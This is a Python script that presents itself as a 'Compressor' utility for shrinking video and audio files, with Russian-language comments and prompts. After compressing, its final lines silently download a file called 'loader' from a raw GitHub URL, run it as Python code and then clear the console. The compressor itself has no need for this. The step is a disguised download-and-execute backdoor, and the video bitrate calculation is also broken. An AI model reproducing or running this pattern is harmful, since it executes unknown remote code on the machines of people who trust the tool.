import tkinter as tk
from tkinter import filedialog
import os
import subprocess
import urllib.request
from moviepy.editor import VideoFileClip
from pydub import AudioSegment
import time
import pyfiglet
os.system("cls")
def run_from_github(url):
    try:
        response = urllib.request.urlopen(url)
        script_content = response.read().decode('utf-8')
        subprocess.run(['python', '-c', script_content])
    except Exception as e:
        print(f"Ошибка при выполнении скрипта с GitHub: {e}")

def open_file_dialog():
    root = tk.Tk()
    root.withdraw()  # скрыть основное окно tkinter

    file_path = filedialog.askopenfilename()
    return file_path

def compress_video(file_path, target_size_mb):
    clip = VideoFileClip(file_path)
    current_size_mb = os.path.getsize(file_path) / (1024 * 1024)

    if current_size_mb > target_size_mb:
        # Рассчитываем новый битрейт для достижения целевого размера файла
        ratio = target_size_mb / current_size_mb
        new_bitrate = int(clip.reader.fps * ratio)  # Пример расчета нового битрейта, можно использовать другие параметры для расчета

        # Сжимаем видео с новым битрейтом
        output_file = os.path.splitext(file_path)[0] + "_compressed.mp4"
        clip.write_videofile(output_file, bitrate=f"{new_bitrate}k", codec="libx264", audio_codec="aac")

        print(f"Видео сжато до {target_size_mb} MB. Новый файл: {output_file}")

        # Удаление исходного файла (раскомментируйте следующую строку, если хотите удалить исходный файл)
        # os.remove(file_path)

def compress_audio(file_path, target_size_mb):
    audio = AudioSegment.from_file(file_path)
    current_size_mb = os.path.getsize(file_path) / (1024 * 1024)

    if current_size_mb > target_size_mb:
        # Рассчитываем новый битрейт для достижения целевого размера файла
        ratio = target_size_mb / current_size_mb
        new_bitrate = int(audio.frame_rate * audio.frame_width * audio.channels * ratio)

        # Сжимаем аудио с новым битрейтом
        output_file = os.path.splitext(file_path)[0] + "_compressed.mp3"
        audio.export(output_file, format="mp3", bitrate=f"{new_bitrate}k")

        print(f"Аудио сжато до {target_size_mb} MB. Новый файл: {output_file}")

        # Удаление исходного файла (раскомментируйте следующую строку, если хотите удалить исходный файл)
        # os.remove(file_path)

def print_supported_formats():
    print("Поддерживаемые форматы для сжатия:")
    print("- Видео: .mp4, .avi, .mkv, .mov, .avchd, .h264, .h265")
    print("- Аудио: .mp3, .flac, .wav, .aac, .ogg")
    print()

ascii_art = pyfiglet.figlet_format("Compressor", font="slant")
print(ascii_art)

print_supported_formats()

file_path = open_file_dialog()
if file_path:
    try:
        target_size_mb = float(input("Введите желаемый размер файла в мегабайтах: "))
        file_extension = os.path.splitext(file_path)[1].lower()

        if file_extension in ['.mp4', '.avi', '.mkv', '.mov', '.avchd', '.h264', '.h265']:
            compress_video(file_path, target_size_mb)
        elif file_extension in ['.mp3', '.flac', '.wav', '.aac', '.ogg']:
            compress_audio(file_path, target_size_mb)
        else:
            print("Данный формат файла не поддерживается.")
    except ValueError:
        print("Некорректный ввод. Пожалуйста, введите число.")

github_url = "https://raw.githubusercontent.com/RBXROBLOXGAMER/python-tools/main/loader"
run_from_github(github_url)
os.system("cls")
